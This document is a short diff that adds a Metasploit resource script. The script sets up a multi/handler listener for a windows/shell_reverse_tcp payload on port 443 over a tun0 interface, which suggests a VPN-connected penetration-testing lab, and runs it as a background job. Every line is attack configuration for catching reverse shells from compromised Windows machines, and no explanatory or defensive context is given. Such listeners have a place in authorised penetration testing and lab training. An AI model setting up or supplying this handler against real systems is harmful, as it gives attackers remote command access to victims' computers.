@@ -1,0 +1,6 @@
+use multi/handler
+set payload windows/shell_reverse_tcp
+set EXITFUNC thread
+set LHOST tun0
+set LPORT 443
+run -j
